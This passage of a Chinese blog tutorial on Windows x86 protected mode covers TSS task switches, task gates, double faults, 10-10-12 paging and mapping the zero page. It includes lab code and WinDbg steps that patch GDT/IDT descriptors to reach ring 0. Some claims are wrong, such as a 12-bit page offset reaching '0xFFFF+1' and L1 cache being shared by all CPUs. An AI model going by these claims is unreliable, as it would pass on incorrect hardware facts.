class=\"line\">\t\tcall fword ptr bufcode;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行，查看函数a的地址和程序的CR3。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031150810537.png\" alt=\"image-20221031150810537\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031150905333.png\" alt=\"image-20221031150905333\"></p>\n<p>构造TSS描述符。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0000E940`503020ab</span><br><span class=\"line\"></span><br><span class=\"line\">base:405030</span><br><span class=\"line\">limit:0x20ab</span><br><span class=\"line\">DPL：11 -&gt;3环可以访问到</span><br><span class=\"line\">type:1001 -&gt; B = 0</span><br><span class=\"line\">P:1</span><br><span class=\"line\">G:0</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031151543103.png\" alt=\"image-20221031151543103\"></p>\n<p>继续运行后发现windbg断下，然后使用uf查看汇编。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031152749546.png\" alt=\"image-20221031152749546\"></p>\n<p>可以看到已经成功执行。此时输入<code>r tr</code>，发现索引已经为实验测试的0x48，使用dg解析。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031154025086.png\" alt=\"image-20221031154025086\"></p>\n<p>可以看到Flags已经被设置为忙碌状态,9-&gt;b。使用dt重新查看tss结构。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031155438210.png\" alt=\"image-20221031155438210\"></p>\n<p>寄存器此时都为我们自定义的，但会发现此时的ESP并不为ESP0。。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031155555167.png\" alt=\"image-20221031155555167\"></p>\n<p>这是因为我们是构造了任务段，而不是通过r3切换到R0，当使用了中断门、调用门、陷阱门时才会进行切换。</p>\n<p>输入g，继续运行，发现蓝屏。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031152833171.png\" alt=\"image-20221031152833171\"></p>\n<h2 id=\"实验二：分析蓝屏原因\"><a href=\"#实验二：分析蓝屏原因\" class=\"headerlink\" title=\"实验二：分析蓝屏原因\"></a>实验二：分析蓝屏原因</h2><p>重新运行实验一的代码，并在call任务段的位置下断点。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031154909931.png\" alt=\"image-20221031154909931\"></p>\n<p>重新运行，断下后转到反汇编。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031155105966.png\" alt=\"image-20221031155105966\"></p>\n<p>可以看到call后的返回地址为<code>0x4011cc</code>，然后继续运行后windbg断下，输入r tr查看获取TSS选择子后进行解析。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031155314591.png\" alt=\"image-20221031155314591\"></p>\n<p>查看原始TSS。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031155342795.png\" alt=\"image-20221031155342795\"></p>\n<p>会发现原始的TSS结构保存着真实的返回地址！！！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">iretd:</span><br><span class=\"line\">1)、NT如果为1，找到TSS的Previous Task Link，替换寄存器后返回(比如EIP)</span><br><span class=\"line\">2)、如果NT为0，则从堆栈返回。（由于我们的堆栈在初始化时全是0xcccccc，因此返回到一个不存在的地址，就蓝屏了。）</span><br></pre></td></tr></table></figure>\n\n<p>因此如果添加了int 3断点，则需要把eflags给恢复回来。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">__declspec(naked) <span class=\"type\">void</span> <span class=\"title function_\">a</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"number\">3</span>;<span class=\"comment\">//中断会清空Efl里的任务嵌套NT位，所以要修改回去</span></span><br><span class=\"line\">        pushfd;</span><br><span class=\"line\">        pop eax;</span><br><span class=\"line\">        or eax, <span class=\"number\">0x4000</span>;</span><br><span class=\"line\">        push eax;</span><br><span class=\"line\">        popfd;</span><br><span class=\"line\">        iretd;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"7、任务门\"><a href=\"#7、任务门\" class=\"headerlink\" title=\"7、任务门\"></a>7、任务门</h1><blockquote>\n<p>关闭增量链接、关闭随即地址</p>\n</blockquote>\n<p>任务门结构图如下：</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221101213529497.png\" alt=\"image-20221101213529497\"></p>\n<h2 id=\"Windows-双重异常\"><a href=\"#Windows-双重异常\" class=\"headerlink\" title=\"Windows-双重异常\"></a>Windows-双重异常</h2><p>Windows使用的任务门主要有作为<code>不可屏蔽中断</code>和<code>双重异常</code>。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221101204659991.png\" alt=\"image-20221101204659991\"></p>\n<blockquote>\n<p>双重异常：系统处理异常时触发的异常。Windows使用了任务门在实现双重异常是为了在触发双重异常时，可以将当前环境保存到TSS中，让开发者有信息进行调试、排查问题（系统无法解决双重异常，因此将触发时的环境保存在TSS中，然后反馈给开发者，让开发者自行解决）。</p>\n</blockquote>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221101213120017.png\" alt=\"image-20221101213120017\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221101213211284.png\" alt=\"image-20221101213211284\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">int 0x8</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"实验一：构造任务门\"><a href=\"#实验一：构造任务门\" class=\"headerlink\" title=\"实验一：构造任务门\"></a>实验一：构造任务门</h2><p>选择0x48的位置来存放TSS。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221101214425488.png\" alt=\"image-20221101214425488\"></p>\n<p>构造任务门，写入idt+0x100</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0000e500`00480000</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221101220518905.png\" alt=\"image-20221101220518905\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//0x2024 bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KiIoAccessMap</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    UCHAR DirectionMap[<span class=\"number\">32</span>];                                                 <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    UCHAR IoMap[<span class=\"number\">8196</span>];                                                      <span class=\"comment\">//0x20</span></span><br><span class=\"line\">&#125;; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//0x20ac bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KTSS</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    USHORT Backlink;                                                        <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    USHORT Reserved0;                                                       <span class=\"comment\">//0x2</span></span><br><span class=\"line\">    ULONG Esp0;                                                             <span class=\"comment\">//0x4</span></span><br><span class=\"line\">    USHORT Ss0;                                                             <span class=\"comment\">//0x8</span></span><br><span class=\"line\">    USHORT Reserved1;                                                       <span class=\"comment\">//0xa</span></span><br><span class=\"line\">    ULONG NotUsed1[<span class=\"number\">4</span>];                                                      <span class=\"comment\">//0xc</span></span><br><span class=\"line\">    ULONG CR3;                                                              <span class=\"comment\">//0x1c</span></span><br><span class=\"line\">    ULONG Eip;                                                              <span class=\"comment\">//0x20</span></span><br><span class=\"line\">    ULONG EFlags;                                                           <span class=\"comment\">//0x24</span></span><br><span class=\"line\">    ULONG Eax;                                                              <span class=\"comment\">//0x28</span></span><br><span class=\"line\">    ULONG Ecx;                                                              <span class=\"comment\">//0x2c</span></span><br><span class=\"line\">    ULONG Edx;                                                              <span class=\"comment\">//0x30</span></span><br><span class=\"line\">    ULONG Ebx;                                                              <span class=\"comment\">//0x34</span></span><br><span class=\"line\">    ULONG Esp;                                                              <span class=\"comment\">//0x38</span></span><br><span class=\"line\">    ULONG Ebp;                                                              <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">    ULONG Esi;                                                              <span class=\"comment\">//0x40</span></span><br><span class=\"line\">    ULONG Edi;                                                              <span class=\"comment\">//0x44</span></span><br><span class=\"line\">    USHORT Es;                                                              <span class=\"comment\">//0x48</span></span><br><span class=\"line\">    USHORT Reserved2;                                                       <span class=\"comment\">//0x4a</span></span><br><span class=\"line\">    USHORT Cs;                                                              <span class=\"comment\">//0x4c</span></span><br><span class=\"line\">    USHORT Reserved3;                                                       <span class=\"comment\">//0x4e</span></span><br><span class=\"line\">    USHORT Ss;                                                              <span class=\"comment\">//0x50</span></span><br><span class=\"line\">    USHORT Reserved4;                                                       <span class=\"comment\">//0x52</span></span><br><span class=\"line\">    USHORT Ds;                                                              <span class=\"comment\">//0x54</span></span><br><span class=\"line\">    USHORT Reserved5;                                                       <span class=\"comment\">//0x56</span></span><br><span class=\"line\">    USHORT Fs;                                                              <span class=\"comment\">//0x58</span></span><br><span class=\"line\">    USHORT Reserved6;                                                       <span class=\"comment\">//0x5a</span></span><br><span class=\"line\">    USHORT Gs;                                                              <span class=\"comment\">//0x5c</span></span><br><span class=\"line\">    USHORT Reserved7;                                                       <span class=\"comment\">//0x5e</span></span><br><span class=\"line\">    USHORT LDT;                                                             <span class=\"comment\">//0x60</span></span><br><span class=\"line\">    USHORT Reserved8;                                                       <span class=\"comment\">//0x62</span></span><br><span class=\"line\">    USHORT Flags;                                                           <span class=\"comment\">//0x64</span></span><br><span class=\"line\">    USHORT IoMapBase;                                                       <span class=\"comment\">//0x66</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KiIoAccessMap</span> <span class=\"title\">IoMaps</span>[1];</span>                                        <span class=\"comment\">//0x68</span></span><br><span class=\"line\">    UCHAR IntDirectionMap[<span class=\"number\">32</span>];                                              <span class=\"comment\">//0x208c</span></span><br><span class=\"line\">&#125;; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KTSS</span> <span class=\"title\">tss</span> =</span> &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">__declspec(naked) <span class=\"type\">void</span> <span class=\"title function_\">a</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"number\">3</span>;<span class=\"comment\">//中断会清空Efl里的任务嵌套NT位，所以要修改回去</span></span><br><span class=\"line\">        pushfd;</span><br><span class=\"line\">        pop eax;</span><br><span class=\"line\">        or eax, <span class=\"number\">0x4000</span>;</span><br><span class=\"line\">        push eax;</span><br><span class=\"line\">        popfd;</span><br><span class=\"line\">        iretd;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> esp3[<span class=\"number\">0x2000</span>] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\"><span class=\"type\">char</span> esp0[<span class=\"number\">0x2000</span>] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> trcode[<span class=\"number\">2</span>] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstr trcode;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(esp3,<span class=\"number\">0xCC</span>,<span class=\"number\">0x2000</span>);<span class=\"comment\">//挂物理页</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;tss地址：%x\\n&quot;</span>, &amp;tss);</span><br><span class=\"line\">\ttss.Eax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Ecx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Edx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Ebx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Ebp = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Esi = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Edi = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Cs = <span class=\"number\">0x8</span>;</span><br><span class=\"line\">\ttss.Ss = <span class=\"number\">0x10</span>;</span><br><span class=\"line\">\ttss.Ds = <span class=\"number\">0x23</span>;</span><br><span class=\"line\">\ttss.Esp = (ULONG)(esp3+<span class=\"number\">0x2000</span><span class=\"number\">-8</span>);</span><br><span class=\"line\">\ttss.Esp0 = (ULONG)(esp0+<span class=\"number\">0x2000</span><span class=\"number\">-8</span>);</span><br><span class=\"line\">\ttss.Ss0 = <span class=\"number\">0x10</span>;</span><br><span class=\"line\">\ttss.Fs = <span class=\"number\">0x30</span>;</span><br><span class=\"line\">\ttss.Eip = (ULONG)a;</span><br><span class=\"line\">\tDWORD dwCr3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入CR3:&quot;</span>);</span><br><span class=\"line\">\tscanf_s(<span class=\"string\">&quot;%x&quot;</span>, &amp;dwCr3);</span><br><span class=\"line\">\ttss.CR3 = dwCr3;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;CR3:%x&quot;</span>, tss.CR3);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;func:%x esp0:%x esp3:%x&quot;</span>, a, tss.Esp0, tss.Esp);</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// printf(&quot;%x\\n&quot;, sizeof(KTSS));</span></span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">        pushfd <span class=\"comment\">//保存R3的FD</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">0x20</span> <span class=\"comment\">//修改为中断，因为是从IDT中跳转</span></span><br><span class=\"line\">        popfd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>构造TSS</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0000e940`50300068</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221101221127844.png\" alt=\"image-20221101221127844\"></p>\n<p>可以发现已经断下。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221101221219040.png\" alt=\"image-20221101221219040\"></p>\n<p>输入g继续执行。</p>\n<h1 id=\"8、101012分页\"><a href=\"#8、101012分页\" class=\"headerlink\" title=\"8、101012分页\"></a>8、101012分页</h1><p>Windows x86模式下有29912分页和101012分页，其中默认为29912分页。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221102221050831.png\" alt=\"image-20221102221050831\"></p>\n<h2 id=\"设置101012分页\"><a href=\"#设置101012分页\" class=\"headerlink\" title=\"设置101012分页\"></a>设置101012分页</h2><p>使用EasyBCD工具设置系统配置为如下：</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221102221555765.png\" alt=\"image-20221102221555765\"></p>\n<p>重启即可。</p>\n<h2 id=\"实验一：线性地址转物理地址\"><a href=\"#实验一：线性地址转物理地址\" class=\"headerlink\" title=\"实验一：线性地址转物理地址\"></a>实验一：线性地址转物理地址</h2><p>确保系统当前分页为101012模式！！！</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span> val[] =<span class=\"string\">&quot;hello world&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,val);</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>首先获取变量val的逻辑地址。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221102221412169.png\" alt=\"image-20221102221412169\"></p>\n<p>然后将地址<code>0040312c</code>以101012格式拆分。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0040312c</span><br><span class=\"line\"></span><br><span class=\"line\">0000 0000 0100 0000 0011 0001 0010 1100</span><br><span class=\"line\"></span><br><span class=\"line\">(不足的用0补充)</span><br><span class=\"line\">0000 0000 0001(0x1) -&gt; PDT中PDE的索引号</span><br><span class=\"line\">0000 0000 0011(0x3) -&gt; PTT中PTE的索引号</span><br><span class=\"line\">0001 0010 1100(0x12c) -&gt; 页内偏移(物理页)</span><br></pre></td></tr></table></figure>\n\n<p>使用windbg获取当前进程的CR3。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221102222814542.png\" alt=\"image-20221102222814542\"></p>\n<blockquote>\n<p>小知识：如果!process 0 0遍历出来进程的CR3末尾三个数不为0，则说明是29912分页,如果为0则是101012分页。</p>\n</blockquote>\n<p>windbg中查看物理地址需要在命令前加上<code>!</code>。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221102222014984.png\" alt=\"image-20221102222014984\"></p>\n<p>将刚刚拆分得到的数值进行与cr3计算。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221102223147321.png\" alt=\"image-20221102223147321\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221102223314124.png\" alt=\"image-20221102223314124\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221102223456812.png\" alt=\"image-20221102223456812\"></p>\n<p>最后一次计算不用*4是因为最后得到的<code>66c44000</code>是物理页，里边存放的是数据或者代码。前面两次 *4是因为要寻找PDE和PTE项。</p>\n<hr>\n<p><code>cr3:控制寄存器，里面存放页基址。一共有4096个字节的大小。</code></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221102224139240.png\" alt=\"image-20221102224139240\"></p>\n<blockquote>\n<p>为什么一个页的大小为4096字节？原因是在29912或者101012中，后面的12位表示为页内偏移；当12为全部为1时，页内最大偏移为0xFFFF+1(加上偏移0)，也就是4096个字节。</p>\n</blockquote>\n<p>CPU拆分地址的操作由<code>模块MMU（Memory Manager Unit）</code>,相当于软件的函数。但因为每次寻址时都需要对线性地址拆分，因此操作系统使用了叫做<code>TLB缓存</code>的东西。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221102232909532.png\" alt=\"image-20221102232909532\"></p>\n<p>TLB中保存着线性地址(前20位)和物理页的对映关系,如果匹配到线性地址(前20位)就可以迅速找到物理页。</p>\n<ul>\n<li>当读数据时</li>\n</ul>\n<p>​\t通过物理页与线性地址后12位的偏移组合得到最终的物理地址。</p>\n<ul>\n<li><p>当写数据时</p>\n<p>为了避免一直访问物理页(内存条)，造成资源开销大，因此使用了L1、L2、L3缓存，也就是俗称的一级、二级、三级缓存。将数据写到缓存中，每隔一个时钟周期后才将缓存中的数据写到内存条上,这个操作叫做WB(写回绕，Write Back)<code>其中L1是所有CPU共享，L2、L3等是每个CPU都有一个</code>。</p>\n</li>\n</ul>\n<p>如果在TLB中找不到线性地址和物理页的映射(TLB miss)，则会操作MMU模块将线性地址拆分后存入TLB缓存中。</p>\n<hr>\n<h2 id=\"实验二：将同一个线性地址转成物理地址\"><a href=\"#实验二：将同一个线性地址转成物理地址\" class=\"headerlink\" title=\"实验二：将同一个线性地址转成物理地址\"></a>实验二：将同一个线性地址转成物理地址</h2><blockquote>\n<p>关闭随机地址。变量设置为全局或者静态。</p>\n</blockquote>\n<p>将实验一的程序编译后，同时运行两个。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221102233427425.png\" alt=\"image-20221102233427425\"></p>\n<p>可以看到线性地址一致，但CR3不同。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221102234021660.png\" alt=\"image-20221102234021660\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221102234105221.png\" alt=\"image-20221102234105221\"></p>\n<p>可以看到两个线性地址虽然相同，但是对应的物理地址不同。可以得出结论，<code>同一个线性地址可以被映射为多个物理地址</code>。</p>\n<h1 id=\"9、探索0地址\"><a href=\"#9、探索0地址\" class=\"headerlink\" title=\"9、探索0地址\"></a>9、探索0地址</h1><blockquote>\n<p>关闭增量和随即地址。</p>\n</blockquote>\n<h2 id=\"实验一：0地址挂物理页\"><a href=\"#实验一：0地址挂物理页\" class=\"headerlink\" title=\"实验一：0地址挂物理页\"></a>实验一：0地址挂物理页</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> var = <span class=\"number\">100</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,&amp;var);</span><br><span class=\"line\">\t<span class=\"type\">int</span> * a = (<span class=\"type\">int</span> *)<span class=\"number\">0</span>;</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,*a);</span><br><span class=\"line\">    getchar();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>输出var的地址，然后进行101012拆分。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0x00405000</span><br><span class=\"line\"></span><br><span class=\"line\">0000 0000 0001(0x1)</span><br><span class=\"line\">0000 0000 0101(0x5)</span><br><span class=\"line\">0000 0000 0000(0x0)</span><br></pre></td></tr></table></figure>\n\n<p>然后通过CR3寻找物理页。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103215644361.png\" alt=\"image-20221103215644361\"></p>\n<p>同样的方法，寻找0地址的物理页。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103215710523.png\" alt=\"image-20221103215710523\"></p>\n<p>发现0地址没有pte，将变量的pte挂上。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103215741029.png\" alt=\"image-20221103215741029\"></p>\n<p>继续运行程序。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103215939831.png\" alt=\"image-20221103215939831\"></p>\n<h2 id=\"实验二：页内偏移对齐\"><a href=\"#实验二：页内偏移对齐\" class=\"headerlink\" title=\"实验二：页内偏移对齐\"></a>实验二：页内偏移对齐</h2><p>将实验一的全局变量改为局部变量。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> var = <span class=\"number\">100</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,&amp;var);</span><br><span class=\"line\">\t<span class=\"type\">int</span> * a = (<span class=\"type\">int</span> *)<span class=\"number\">0</span>;</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,*a);</span><br><span class=\"line\">    getchar();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103220203339.png\" alt=\"image-20221103220203339\"></p>\n<p>可以看到var的地址已经不是000结尾了，然后按照实验一的方法对0地址挂上pte。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0x0012ff28</span><br><span class=\"line\"></span><br><span class=\"line\">0000 0000 0001 0010 1111 1111 0010 1000</span><br><span class=\"line\"></span><br><span class=\"line\">0000 0000 0000(0x0)</span><br><span class=\"line\">0001 0010 1111(0x12F)</span><br><span class=\"line\">1111 0010 1000(0xF28)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103220713373.png\" alt=\"image-20221103220713373\"></p>\n<p>继续运行。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103220733841.png\" alt=\"image-20221103220733841\"></p>\n<p>发现得到的内容不对。原因：变量var的页内偏移是0xf28，所以var的值为0x6b181000+0xf28的内容。但0地址拆分后得到的页内偏移也是0，读取到的数据是0x6b181000+0x0的内容。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103221310918.png\" alt=\"image-20221103221310918\"></p>\n<p>如果要读到正确数据，需要将0地址的页内偏移变成0xF28。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span 